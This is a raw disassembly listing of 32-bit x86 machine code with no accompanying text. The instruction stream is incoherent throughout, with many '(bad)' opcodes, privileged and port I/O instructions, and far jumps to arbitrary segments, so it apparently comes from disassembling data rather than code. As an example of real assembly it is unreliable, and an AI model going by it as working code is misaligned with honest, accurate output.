  41e32f:	jle    0x41e2f1
  41e331:	bound  esi,QWORD PTR [esi]
  41e333:	push   es
  41e334:	rcr    BYTE PTR [ebp+0x4d],0xb9
  41e338:	adc    BYTE PTR [ebx+0x7cc6d521],al
  41e33e:	push   edx
  41e33f:	loope  0x41e392
  41e341:	test   edx,edi
  41e343:	je     0x41e3b8
  41e345:	push   es
  41e346:	lock pushf 
  41e348:	mov    bl,0x8d
  41e34a:	pushf  
  41e34b:	pop    ebx
  41e34c:	(bad)  
  41e34d:	retf   
  41e34e:	jmp    0x626718c3
  41e353:	lods   al,BYTE PTR ds:[esi]
  41e354:	adc    BYTE PTR [ebp+0xbc2ff08],0x56
  41e35b:	(bad)  
  41e35c:	fist   DWORD PTR [esi+0xc]
  41e35f:	jae    0x41e3a2
  41e361:	push   cs
  41e362:	xor    DWORD PTR [eax+0x1d],eax
  41e365:	push   esp
  41e366:	and    DWORD PTR [esp+ebx*2-0x25],ecx
  41e36a:	loope  0x41e33a
  41e36c:	dec    ebx
  41e36d:	int    0xe9
  41e36f:	push   edi
  41e370:	xchg   BYTE PTR [ebx-0xe],ah
  41e373:	pusha  
  41e374:	mov    eax,0xbb1f7b0
  41e379:	push   cs
  41e37a:	rol    eax,0x52
  41e37d:	loopne 0x41e358
  41e37f:	popa   
  41e380:	sub    al,0xc2
  41e382:	cli    
  41e383:	shl    DWORD PTR [eax+0x64ec8bfc],cl
  41e389:	mov    edx,cr4
  41e38c:	je     0x41e366
  41e38e:	xor    bl,BYTE PTR [ebx-0x2f571bf2]
  41e394:	dec    esp
  41e395:	pop    ss
  41e396:	and    al,0x77
  41e398:	mov    ebp,0xb5a0e140
  41e39d:	loopne 0x41e382
  41e39f:	retf   0x2e80
  41e3a2:	jae    0x41e361
  41e3a4:	cwde   
  41e3a5:	add    eax,0x59266d75
  41e3aa:	out    0x65,eax
  41e3ac:	jnp    0x41e3ff
  41e3ae:	adc    ch,BYTE PTR [edi-0x4933fded]
  41e3b4:	mov    cl,0x41
  41e3b6:	mov    al,0x97
  41e3b8:	sar    BYTE PTR [esi+0x13],1
  41e3bb:	ficom  WORD PTR [eax]
  41e3bd:	pop    esi
  41e3be:	xlat   BYTE PTR ds:[ebx]
  41e3bf:	cmp    edi,ebp
  41e3c1:	gs dec ebp
  41e3c3:	lock xchg edx,eax
  41e3c5:	rcr    DWORD PTR [esi+0x20],cl
  41e3c8:	aad    0x99
  41e3ca:	cmp    bl,cl
  41e3cc:	mov    dh,0xe6
  41e3ce:	ss into 
  41e3d0:	sub    ecx,DWORD PTR [eax+0x1f]
  41e3d3:	push   esi
  41e3d4:	and    DWORD PTR [esi],0xffffff83
  41e3d7:	rcr    BYTE PTR [edx-0xd],cl
  41e3da:	fadd   QWORD PTR [eax+0x26]
  41e3dd:	mov    eax,0xd29e21d6
  41e3e2:	arpl   WORD PTR [esi+0x6e],sp
  41e3e5:	repz dec ecx
  41e3e7:	std    
  41e3e8:	push   0x72
  41e3ea:	stos   DWORD PTR es:[edi],eax
  41e3eb:	jmp    DWORD PTR [edi]
  41e3ed:	inc    edx
	...
  41e456:	mov    DWORD PTR [edx],edx
  41e458:	ja     0x41e479
  41e45a:	(bad)  
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0x675e2b09
  41e465:	push   esp
  41e466:	addr16 inc ebp
  41e468:	add    DWORD PTR [eax],eax
  41e46a:	add    BYTE PTR [ecx],al
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	inc    edi
  41e46f:	out    0x8a,al
  41e471:	jmp    0xb943:0x6d53c33
  41e478:	add    BYTE PTR [ebx+edx*1],ch
  41e47b:	out    dx,eax
  41e47c:	pop    ds
  41e47d:	add    cl,BYTE PTR [esi+0x4e]
  41e480:	es cmp al,0x9a
  41e483:	xlat   BYTE PTR ds:[ebx]
  41e484:	jl     0x41e484
  41e486:	cmc    
  41e487:	jmp    0x917d:0xd2973114
  41e48e:	sbb    eax,DWORD PTR [ebx+0x1cf5d825]
  41e494:	pusha  
  41e495:	cmp    BYTE PTR [edx+0x7d78ed0c],bh
  41e49b:	out    dx,eax
  41e49c:	jb     0x41e4f0
  41e49e:	cli    
  41e49f:	adc    ebx,ecx
  41e4a1:	mov    WORD PTR [edx+0x5],ds
  41e4a4:	mov    al,0x9
  41e4a6:	cmp    DWORD PTR [edi-0x69],esp
  41e4a9:	push   esi
  41e4aa:	pop    ss
  41e4ab:	sbb    esp,DWORD PTR [edx+ecx*1+0x653a0427]
  41e4b2:	and    eax,DWORD PTR [esp+ecx*8+0x2f]
  41e4b6:	mov    BYTE PTR [ecx-0x34],ch
  41e4b9:	mov    edi,0xc0bf2add
  41e4be:	pop    ebx
  41e4bf:	pop    ss
  41e4c0:	lods   al,BYTE PTR ds:[esi]
  41e4c1:	mov    ebx,0x5878326a
  41e4c6:	ss or  edx,esi
  41e4c9:	jbe    0x41e531
  41e4cb:	or     ah,ch
  41e4cd:	lods   eax,DWORD PTR ds:[esi]
  41e4ce:	inc    eax
  41e4cf:	(bad)  
  41e4d0:	adc    esi,DWORD PTR [edi+0x25099b70]
  41e4d6:	retf   
  41e4d7:	(bad)  [ebx]
  41e4d9:	mov    ah,0xba
  41e4db:	mov    eax,ds:0x43fc8929
  41e4e0:	stos   BYTE PTR es:[edi],al
  41e4e1:	aam    0xea
  41e4e3:	sub    ch,BYTE PTR [eax+0x7]
  41e4e6:	push   0xeb6fcf20
  41e4eb:	or     DWORD PTR [edi],esp
  41e4ed:	test   eax,0xdadd2e82
  41e4f2:	pop    ds
  41e4f3:	sbb    DWORD PTR [edx+edx*8],ebp
  41e4f6:	sub    edi,DWORD PTR ds:0x7c781fd
  41e4fd:	nop
  41e4fe:	cmp    cl,BYTE PTR [edx]
  41e500:	xchg   DWORD PTR [ebx],esi
  41e502:	out    0x38,al
  41e504:	push   ebx
  41e505:	in     eax,dx
  41e506:	fstp   TBYTE PTR [edx+0x6a]
  41e509:	je     0x41e4fe
  41e50b:	enter  0x960c,0xde
  41e50f:	mov    DWORD PTR [ecx+eiz*2+0x27],edx
  41e513:	ja     0x41e49b
  41e515:	shl    dh,cl
  41e517:	popf   
  41e518:	(bad)  
  41e519:	in     eax,0xc4
  41e51b:	adc    eax,DWORD PTR ds:0xef29c1d0
  41e521:	xchg   esp,eax
  41e522:	ja     0x41e576
  41e524:	inc    BYTE PTR [edi+ebx*4+0x1fa85441]
  41e52b:	pop    edx
  41e52c:	push   ebx
  41e52d:	mov    eax,0xfba6db16
  41e532:	or     BYTE PTR [edx-0x17229e22],bh
  41e538:	fucomp st(6)
  41e53a:	aas    
  41e53b:	push   esp
  41e53c:	xlat   BYTE PTR ds:[ebx]
  41e53d:	push   ebx
  41e53e:	pop    esi
  41e53f:	push   edx
  41e540:	or     bl,al
  41e542:	adc    al,0x43
  41e544:	(bad)  
  41e545:	int    0x6b
  41e547:	enter  0x6543,0x56
  41e54b:	push   eax
  41e54c:	sbb    bh,bl
  41e54e:	fstp   TBYTE PTR [esi+0xbf7fd06]
  41e554:	stos   BYTE PTR es:[edi],al
  41e555:	sub    BYTE PTR [eax+eiz*2+0x5c],ch
  41e559:	test   al,0xc5
  41e55b:	lahf   
  41e55c:	scas   eax,DWORD PTR es:[edi]
  41e55d:	mov    bl,0x67
  41e55f:	into   
  41e560:	stos   DWORD PTR es:[edi],eax
  41e561:	or     eax,0x720f167f
  41e566:	jnp    0x41e52b
  41e568:	int    0xc2
  41e56a:	dec    edx
  41e56b:	(bad)  
  41e56c:	out    0x8e,al
	...
  41e5d6:	and    BYTE PTR [edx-0x35],ch
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e566
  41e5e3:	adc    cl,dl
  41e5e5:	iret   
  41e5e6:	addr16 inc esi
  41e5e8:	add    DWORD PTR [eax],eax
  41e5ea:	add    BYTE PTR [ecx],al
  41e5ec:	add    BYTE PTR [eax],al
  41e5ee:	in     eax,dx
  41e5ef:	imul   ecx
  41e5f1:	push   ds
  41e5f2:	cmp    al,0x5d
  41e5f4:	outs   dx,BYTE PTR ds:[esi]
  41e5f5:	dec    ecx
  41e5f6:	mov    eax,ds:0xb5014b5e
  41e5fb:	(bad)  
  41e5fc:	fldcw  WORD PTR ds:0x20444d0d
  41e602:	es xchg ebp,eax
  41e604:	dec    ecx
  41e605:	outs   dx,DWORD PTR ds:[esi]
  41e606:	xchg   ebx,eax
  41e607:	loope  0x41e66b
  41e609:	mov    ds:0xf760a1bd,eax
  41e60e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e60f:	push   esp
  41e610:	sub    esp,DWORD PTR [edx-0x84206b0]
  41e616:	in     al,0x9
  41e618:	push   ebx
  41e619:	cmp    DWORD PTR [ebx-0x3e],esi
  41e61c:	scas   al,BYTE PTR es:[edi]
  41e61d:	pop    es
  41e61e:	inc    esp
  41e61f:	nop
  41e620:	pusha  
  41e621:	ror    DWORD PTR [ecx],cl
  41e623:	sar    ebx,1
  41e625:	in     al,dx
  41e626:	dec    ebp
  41e627:	popa   
  41e628:	pop    esi
  41e629:	out    0x63,eax
  41e62b:	sub    ch,BYTE PTR [edx]
  41e62d:	mov    ebp,0x26b71bd4
  41e632:	call   0x5954dd6e
  41e637:	out    dx,eax
  41e638:	leave  
  41e639:	in     eax,0x1b
  41e63b:	aaa    
  41e63c:	adc    ecx,esi
  41e63e:	pop    edi
  41e63f:	xor    al,0x7e
  41e641:	mov    ds:0x5595efe,al
  41e646:	cmp    dh,bl
  41e648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e649:	push   esi
  41e64a:	into   
  41e64b:	imul   edx,DWORD PTR [esi-0x70fb0d1a],0x62d4e673
  41e655:	addr16 xchg edx,eax
  41e657:	repz pop esi
  41e659:	xlat   BYTE PTR ds:[ebx]
  41e65a:	push   ebp
  41e65c:	fwait
  41e65d:	cmc    
  41e65e:	inc    edx
  41e65f:	xchg   esi,eax
  41e660:	xor    bl,BYTE PTR ds:0xea5d1eaa
  41e666:	push   ds
  41e667:	mov    edi,0xc61b6a92
  41e66c:	xor    bh,BYTE PTR [ecx-0x23529dc3]
  41e672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e673:	sub    ecx,DWORD PTR [edx-0x5738cc52]
  41e679:	cmp    ah,BYTE PTR [edx-0x4c]
  41e67c:	rcl    BYTE PTR [esi-0x477da877],0xd8
  41e683:	pop    eax
  41e684:	jg     0x41e69d
  41e686:	sub    eax,0x8a28a237
  41e68b:	(bad)  
  41e68c:	out    dx,al
  41e68d:	out    0x75,al
  41e68f:	and    al,0xd5
  41e691:	xor    DWORD PTR [ebx-0x4b6e963],esp
  41e697:	jbe    0x41e650
  41e699:	popf   
  41e69a:	out    dx,al
  41e69b:	mov    edi,gs
  41e69d:	call   0x4041:0xb6fbf469
  41e6a4:	pop    ds
  41e6a5:	sbb    DWORD PTR [edx+edi*4+0xe5b5f90],edi
  41e6ac:	cmp    eax,0xc9054c79
  41e6b1:	push   eax
  41e6b2:	jae    0x41e6d2
  41e6b4:	pop    edi
  41e6b5:	push   edx
  41e6b6:	xor    ebp,DWORD PTR [ebx+0x6a8cf805]
  41e6bc:	dec    esp
  41e6bd:	pop    ss
  41e6be:	inc    esi
  41e6bf:	adc    ah,cl
  41e6c1:	jmp    0x7426a8b
  41e6c6:	push   eax
  41e6c7:	js     0x41e6d4
  41e6c9:	pop    ecx
  41e6ca:	daa    
  41e6cb:	sbb    ebx,DWORD PTR [esi]
  41e6cd:	jecxz  0x41e6c7
  41e6cf:	mov    bh,cl
  41e6d1:	or     bl,BYTE PTR [ebp+0x2817f49f]
  41e6d7:	aad    0x24
  41e6d9:	push   ebp
  41e6da:	ss mov edi,ebx
  41e6dd:	inc    esi
  41e6de:	mul    DWORD PTR es:[edx-0x4e]
  41e6e2:	imul   esi,DWORD PTR [esi],0x75c996b4
  41e6e8:	scas   al,BYTE PTR es:[edi]
  41e6e9:	not    BYTE PTR [esp+ebx*2+0x68dd]
	...
  41e754:	add    BYTE PTR [eax],al
  41e756:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e75c:	cmc    
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    edi,DWORD PTR [esi-0x16]
  41e764:	adc    DWORD PTR [edi],edi
  41e766:	addr16 inc edi
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	add    BYTE PTR [ecx],al
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	xchg   ebx,eax
  41e76f:	and    DWORD PTR [ecx-0x70],ebp
  41e772:	lods   eax,DWORD PTR ds:[esi]
  41e773:	out    dx,eax
  41e774:	jmp    0x41e7d8
  41e776:	inc    eax
  41e777:	lods   al,BYTE PTR ds:[esi]
  41e778:	int    0x42
  41e77a:	mov    esi,0xa315e56d
  41e77f:	(bad)  
  41e781:	test   eax,0xb84dfc92
  41e786:	jmp    0xcc34:0x7aea2de2
  41e78d:	mov    ebx,DWORD PTR [esi*1+0x318c2980]
  41e794:	fldenv [ebp-0x575f4509]
  41e79a:	mov    eax,ds:0x83ddc449
  41e79f:	inc    ebp
  41e7a0:	call   0x1b02:0xda6c79f1
  41e7a7:	loope  0x41e807
  41e7a9:	popf   
  41e7aa:	push   0x9fbef3f6
  41e7af:	fnsave [esi+eiz*1]
  41e7b2:	mov    bh,0xc8
  41e7b4:	outs   dx,DWORD PTR ds:[esi]
  41e7b5:	inc    esp
  41e7b6:	shl    BYTE PTR [ecx+0x783bc0dc],1
  41e7bc:	inc    edi
  41e7bd:	and    DWORD PTR [ebx-0x5e],ebx
  41e7c0:	inc    ebp
  41e7c1:	mov    cl,0x2e
  41e7c3:	jnp    0x41e831
  41e7c5:	mov    esp,0x5a640d95
  41e7ca:	lods   eax,DWORD PTR ds:[esi]
  41e7cb:	retf   
  41e7cc:	aas    
  41e7cd:	or     esi,0x5359683a
  41e7d3:	sub    edx,DWORD PTR [ebp+0x68]
  41e7d6:	cmp    al,0x98
  41e7d8:	jno    0x41e7f2
  41e7da:	pop    esp
  41e7db:	lea    esp,[edi-0xbad24ae]
  41e7e1:	imul   edx,DWORD PTR [esi],0xe7a3344
  41e7e7:	arpl   WORD PTR [ebx+0x209fa33e],bx
  41e7ed:	aam    0xfc
  41e7ef:	or     dl,bh
  41e7f1:	sbb    ch,dl
  41e7f3:	push   es
  41e7f4:	push   es
  41e7f5:	imul   ebx,DWORD PTR [edi+0x7825f375],0xfc0d22fe
  41e7ff:	neg    ebp
  41e801:	test   al,0xad
  41e803:	sbb    DWORD PTR [si],esp
  41e806:	loop   0x41e78b
  41e808:	cli    
  41e809:	fisubr DWORD PTR ds:0xa1db2735
  41e80f:	dec    edi
  41e810:	mov    al,ds:0x2c23f294
  41e815:	lods   al,BYTE PTR ds:[esi]
  41e816:	outs   dx,BYTE PTR ds:[esi]
  41e817:	push   esp
  41e818:	mov    edx,0x6bae05b1
  41e81d:	mov    esp,0x5f404d65
  41e822:	mov    ecx,0xe0b35c11
  41e827:	inc    esp
  41e828:	push   bx
  41e82a:	xchg   edi,eax
  41e82b:	scas   al,BYTE PTR es:[edi]
  41e82c:	rcl    ebp,1
  41e82e:	gs push ecx
  41e830:	xchg   DWORD PTR [esi-0x6f1f2bc4],edi
  41e836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e837:	sub    ecx,esi
  41e839:	xchg   edx,eax
  41e83a:	mov    ecx,0x9ed2a0f0
  41e83f:	loopne 0x41e859
  41e841:	jge    0x41e82e
  41e843:	adc    esi,DWORD PTR [ebx+0x67a44ae0]
  41e849:	outs   dx,BYTE PTR ds:[esi]
  41e84a:	addr16 out dx,eax
  41e84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e84d:	clc    
  41e84e:	inc    eax
  41e84f:	je     0x41e870
  41e851:	fist   DWORD PTR [edi-0x1a323c05]
  41e857:	es (bad) 
  41e859:	mov    ?,esp
  41e85b:	inc    esp
  41e85c:	mov    ah,0x4f
  41e85e:	push   eax
  41e85f:	stc    
  41e860:	xchg   BYTE PTR gs:[eax],ah
  41e863:	(bad)  
  41e864:	out    dx,eax
  41e865:	pop    edx
  41e866:	mov    edi,ss
  41e868:	icebp  
  41e869:	dec    ebx
  41e86a:	ss mov bh,0x7b
  41e86d:	pop    esi
	...
  41e8d6:	sub    eax,0x9e5c8a39
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e8f2
  41e8e3:	fld    QWORD PTR [eax+0x1486796]
  41e8e9:	add    BYTE PTR [eax],al
  41e8eb:	add    DWORD PTR [eax],eax
  41e8ed:	add    ch,dh
  41e8ef:	mov    bh,0xc3
  41e8f1:	int3   
  41e8f2:	add    BYTE PTR [esi],dh
  41e8f4:	popf   
  41e8f5:	outs   dx,BYTE PTR ds:[esi]
  41e8f6:	ds test eax,0x587d7a03
  41e8fc:	sub    DWORD PTR [edx+eax*8+0x64],edx
  41e900:	xchg   ebp,eax
  41e901:	jb     0x41e935
  41e903:	push   eax
  41e904:	loopne 0x41e8b6
  41e906:	cdq    
  41e907:	ret    0x4c35
  41e90a:	mov    ah,0xeb
  41e90c:	jno    0x41e984
  41e90e:	sahf   
  41e90f:	push   ebp
  41e910:	mov    ebx,cr2
  41e913:	adc    ecx,DWORD PTR [eax+0x48]
  41e916:	mov    esi,0x94767db3
  41e91b:	pop    eax
  41e91c:	pop    ebx
  41e91d:	sbb    dh,0x7b
  41e920:	ins    BYTE PTR es:[edi],dx
  41e921:	add    DWORD PTR [esi],esi
  41e923:	cs and al,0x24
  41e926:	aad    0x5d
  41e928:	sahf   
  41e929:	loopne 0x41e8c7
  41e92b:	test   BYTE PTR [edi+edi*1],al
  41e92e:	xchg   ebx,eax
  41e92f:	call   0x138b013b
  41e934:	jb     0x41e959
  41e936:	inc    esp
  41e937:	mov    WORD PTR [esi-0x3f834d7a],gs
  41e93d:	(bad)  
  41e93e:	cmp    DWORD PTR [ebx-0x78],eax
  41e941:	xor    al,0xeb
  41e943:	mov    al,0xf4
  41e945:	das    
  41e946:	dec    ecx
  41e947:	fisttp QWORD PTR [ebp+ebx*4+0x50]
  41e94b:	jae    0x41e9b5
  41e94d:	fimul  WORD PTR [ebp+0x6e784e26]
  41e953:	test   al,0x3e
  41e955:	fldcw  WORD PTR [ecx]
  41e957:	inc    esp
  41e958:	pop    ebp
  41e959:	inc    ecx
  41e95a:	add    eax,0xc84f8b45
  41e95f:	xor    al,0x45
  41e961:	sti    
  41e962:	fdivr  DWORD PTR [esi+esi*2+0x5e1fee92]
  41e969:	add    al,0x10
  41e96b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e96c:	scas   al,BYTE PTR es:[edi]
  41e96d:	sti    
  41e96e:	js     0x41e969
  41e970:	add    eax,0xd6ddc853
  41e975:	stc    
  41e976:	jno    0x41e996
  41e978:	inc    esi
  41e979:	test   eax,0x6339dfcc
  41e97e:	xchg   BYTE PTR [esi],dl
  41e980:	xchg   esi,eax
  41e981:	dec    edi
  41e982:	xor    eax,0x72671343
  41e987:	dec    ebp
  41e988:	dec    eax
  41e989:	and    bh,al
  41e98b:	mov    esi,0x945c4432
  41e990:	imul   eax,DWORD PTR es:[ebx+0x70],0x267bccb9
  41e998:	sahf   
  41e999:	jg     0x41e976
  41e99b:	iret   
  41e99c:	sbb    bh,BYTE PTR [ebp+0x4c9bc6f6]
  41e9a2:	outs   dx,BYTE PTR ds:[esi]
  41e9a3:	push   es
  41e9a4:	xchg   edx,eax
  41e9a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9a6:	test   eax,0x5f8d261
  41e9ab:	loop   0x41e93f
  41e9ad:	(bad)  
  41e9ae:	rcr    ah,0xd2
  41e9b1:	fldcw  WORD PTR [edi]
  41e9b3:	mov    ?,WORD PTR [ebx]
  41e9b5:	jg     0x41e9ae
  41e9b7:	push   eax
  41e9b8:	inc    edx
  41e9b9:	mov    ecx,0xf6d0d9c1
  41e9be:	jno    0x41e96a
  41e9c0:	adc    DWORD PTR [ecx+0x51],0x1a79a6ad
  41e9c7:	push   edx
  41e9c8:	push   edi
  41e9c9:	pusha  
  41e9ca:	das    
  41e9cb:	(bad)  
  41e9cc:	(bad)  
  41e9cd:	iret   
  41e9ce:	sub    eax,0x506b2372
  41e9d3:	mov    fs,WORD PTR [esi-0x6f]
  41e9d6:	mov    eax,0x4fc22994
  41e9db:	xor    eax,0x4831bf30
  41e9e0:	and    al,0x3a
  41e9e2:	lock lahf 
  41e9e4:	int3   
  41e9e5:	xchg   ah,dh
  41e9e7:	mov    al,0xb4
  41e9e9:	push   ss
  41e9ea:	icebp  
  41e9eb:	xchg   edi,esi
  41e9ed:	iret   
	...
  41ea56:	js     0x41ea55
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	push   ss
  41ea63:	shr    bh,cl
  41ea65:	jo     0x41eace
  41ea67:	dec    ecx
  41ea68:	add    DWORD PTR [eax],eax
  41ea6a:	add    BYTE PTR [ecx],al
  41ea6c:	add    BYTE PTR [eax],al
  41ea6e:	jae    0x41ea33
  41ea70:	xchg   ebx,eax
  41ea71:	dec    esi
  41ea72:	jae    0x41ea45
  41ea74:	jl     0x41ea50
  41ea76:	inc    esi
  41ea77:	(bad)  [edi-0x2fac1a5b]
  41ea7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea7e:	adc    BYTE PTR [edi-0xe446975],ah
  41ea84:	xor    ebx,eax
  41ea86:	bound  ecx,QWORD PTR [ebx+0x19]
  41ea89:	mov    bl,0x7a
  41ea8b:	clc    
  41ea8c:	cwde   
  41ea8d:	loopne 0x41ea3b
  41ea8f:	aaa    
  41ea90:	mov    ss,edi
  41ea92:	in     eax,dx
  41ea93:	bound  esp,QWORD PTR [esi+0x5d]
  41ea96:	scas   eax,DWORD PTR es:[edi]
  41ea97:	outs   dx,BYTE PTR ds:[esi]
  41ea98:	xchg   ecx,eax
  41ea99:	jbe    0x41ea64
  41ea9b:	out    0x6,al
  41ea9d:	fdiv   DWORD PTR [ebx]
  41ea9f:	mov    bh,0x36
  41eaa1:	das    
  41eaa2:	jo     0x41eb1f
  41eaa4:	xchg   bl,cl
  41eaa6:	mov    ebx,0x6c25b81e
  41eaab:	nop
  41eaac:	call   0x904b:0x7d323777
  41eab3:	fs call 0xe035:0xe76d3cec
  41eabb:	in     eax,dx
  41eabc:	aam    0x44
  41eabe:	imul   eax,DWORD PTR [eax+0x30],0xffffffb8
  41eac2:	mov    ch,0x5f
  41eac4:	mov    al,0xdf
  41eac6:	mov    edi,0xb504be8c
  41eacb:	retf   
  41eacc:	mov    dh,0x37
  41eace:	lock xchg ax,ax
  41ead1:	adc    ebp,0x46
  41ead4:	mov    ah,0xe4
  41ead6:	or     DWORD PTR ds:0x383c82a7,0x733f2582
  41eae0:	(bad)  
  41eae2:	xor    eax,0x748884c9
  41eae7:	in     eax,dx
  41eae8:	xchg   edi,eax
  41eae9:	mov    cs,ecx
  41eaeb:	mov    eax,ds:0xb8db2d57
  41eaf0:	cld    
  41eaf1:	sti    
  41eaf2:	mov    eax,ds:0x1b68a36f
  41eaf7:	stos   DWORD PTR es:[edi],eax
  41eaf8:	dec    esi
  41eaf9:	xchg   edx,eax
  41eafa:	pop    ds
  41eafb:	add    bl,BYTE PTR [ebp-0x53472a0f]
  41eb01:	addr16 nop
  41eb03:	je     0x41eaa3
  41eb05:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41eb07:	out    dx,al
  41eb08:	rcl    DWORD PTR [edi-0x4df7027],0x91
  41eb0f:	sbb    eax,DWORD PTR ds:0x50fe5afe
  41eb15:	mov    edx,0x8289f117
  41eb1a:	pop    ebx
  41eb1b:	in     al,0xa6
  41eb1d:	retf   0x1308
  41eb20:	jne    0x41eb25
  41eb22:	out    dx,eax
  41eb23:	pop    ss
  41eb24:	out    dx,eax
  41eb25:	call   0x8bf1:0x6e5f2b8a
  41eb2c:	out    dx,eax
  41eb2d:	inc    eax
  41eb2e:	jne    0x41eb35
  41eb30:	dec    eax
  41eb31:	xchg   ecx,eax
  41eb32:	sub    DWORD PTR [eax+0x13b886ea],0xffffff96
  41eb39:	ret    0x842
  41eb3c:	ret    0x250b
  41eb3f:	mov    edi,0x84d3391b
  41eb44:	adc    esi,DWORD PTR [ecx]
  41eb46:	not    DWORD PTR [esi]
  41eb48:	pop    ecx
  41eb49:	(bad)  
  41eb4a:	cli    
  41eb4b:	aas    
  41eb4c:	jbe    0x41ead2
  41eb4e:	adc    al,0xea
  41eb50:	adc    eax,esp
  41eb52:	cmp    bh,0xe4
  41eb55:	sti    
  41eb56:	mov    esi,ds
  41eb58:	out    dx,eax
  41eb59:	inc    edi
  41eb5a:	and    al,0x53
  41eb5c:	jle    0x41eb9c
  41eb5e:	call   0x1cad983f
  41eb63:	jb     0x41eb60
  41eb65:	in     eax,dx
  41eb66:	fidivr WORD PTR [esi]
  41eb68:	nop
  41eb69:	xor    eax,0xdd2b243d
	...
  41ebd6:	adc    ch,BYTE PTR [edi]
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0x1e
  41ebe3:	outs   dx,BYTE PTR ds:[esi]
  41ebe4:	scas   al,BYTE PTR es:[edi]
  41ebe5:	(bad)  
  41ebe6:	addr16 dec edx
  41ebe8:	add    DWORD PTR [eax],eax
  41ebea:	add    BYTE PTR [ecx],al
  41ebec:	add    BYTE PTR [eax],al
  41ebee:	scas   al,BYTE PTR es:[edi]
  41ebef:	dec    esi
  41ebf0:	ror    BYTE PTR [esi+0x36],0xb2
  41ebf4:	xchg   edi,eax
  41ebf5:	data16 sbb BYTE PTR [edi+0x7f7e1043],dl
  41ebfc:	scas   al,BYTE PTR es:[edi]
  41ebfd:	mov    esi,0x42d4c066
  41ec02:	inc    ecx
  41ec03:	scas   eax,DWORD PTR es:[edi]
  41ec04:	pop    es
  41ec05:	mov    al,0xe8
  41ec07:	push   eax
  41ec08:	cmp    eax,0x59cb22f0
  41ec0d:	pop    edx
  41ec0e:	rol    dh,0x81
  41ec11:	lds    eax,FWORD PTR [edx+0x479e448d]
  41ec17:	xchg   BYTE PTR [ecx+0x10],dh
  41ec1a:	adc    BYTE PTR [edi+edx*8+0x630deffc],al
  41ec21:	jmp    FWORD PTR [ebx]
  41ec23:	xchg   DWORD PTR [ebp-0x28388423],ebx
  41ec29:	xor    esi,ecx
  41ec2b:	arpl   WORD PTR [edx],ax
  41ec2d:	jg     0x41ec29
  41ec2f:	sbb    eax,eax
  41ec31:	mov    ch,0x3d
  41ec33:	in     al,dx
  41ec34:	or     DWORD PTR [ebx+eax*8-0x29bd8ccd],esi
  41ec3b:	clc    
  41ec3c:	mov    ch,0x6f
  41ec3e:	mov    ebx,DWORD PTR [ecx+0x38]
  41ec41:	inc    eax
  41ec42:	in     al,0xbf
  41ec44:	or     edx,esi
  41ec46:	push   edi
  41ec47:	pop    edx
  41ec48:	arpl   WORD PTR [edi],bx
  41ec4a:	adc    bl,bh
  41ec4c:	test   BYTE PTR [ebp+0x23],0xbf
  41ec50:	jae    0x41ebf1
  41ec52:	(bad)  
  41ec54:	shl    BYTE PTR [ecx+0x2b9f634a],cl
  41ec5a:	in     al,0xfe
  41ec5c:	push   esp
  41ec5d:	mov    al,ds:0xc74102a3
  41ec62:	stos   DWORD PTR es:[edi],eax
  41ec63:	fsub   QWORD PTR [edi-0x295f711]
  41ec69:	stc    
  41ec6a:	mov    WORD PTR [esi+0x44],gs
  41ec6d:	dec    DWORD PTR [edx+edi*2-0x26]
  41ec71:	ror    DWORD PTR ds:0x4ee8eaa4,1
  41ec77:	sbb    dl,BYTE PTR [ebx+0x70ca1f49]
  41ec7d:	add    BYTE PTR es:[ecx],0xca
  41ec81:	sub    al,ah
  41ec83:	retf   
  41ec84:	pop    ebx
  41ec85:	loop   0x41ecd1
  41ec87:	fsubr  QWORD PTR ds:0x4a8f94f5
  41ec8d:	dec    edi
  41ec8e:	add    cl,BYTE PTR [ebx+0x25fff54e]
  41ec94:	fsub   DWORD PTR [bx]
  41ec97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec98:	xchg   ebp,eax
  41ec99:	cmp    ecx,DWORD PTR [esi+0x77]
  41ec9c:	out    dx,al
  41ec9d:	cld    
  41ec9e:	je     0x41eca4
  41eca0:	clc    
  41eca1:	fs xchg dh,ah
  41eca4:	jl     0x41ed16
  41eca6:	lahf   
  41eca7:	fcom   st(5)
  41eca9:	in     al,dx
  41ecaa:	test   ebp,eax
  41ecac:	fwait
  41ecad:	push   ebx
  41ecae:	mov    ebp,0xbc3f830b
  41ecb3:	jge    0x41ed34
  41ecb5:	xor    eax,0x4eaf25ce
  41ecba:	test   BYTE PTR [ebp-0x6603a85f],0xab
  41ecc1:	fwait
  41ecc2:	mov    DWORD PTR [ebp+0x5d],esp
  41ecc5:	dec    ecx
  41ecc6:	fdiv   st,st(7)
  41ecc8:	dec    esi
  41ecc9:	cmp    al,0xb9
  41eccb:	xor    DWORD PTR [eax],edx
  41eccd:	and    ch,BYTE PTR [edx+0x2f3c75bd]
  41ecd3:	pushf  
  41ecd4:	pop    ecx
  41ecd5:	nop
  41ecd6:	and    dl,BYTE PTR [eax-0x21]
  41ecd9:	pop    edx
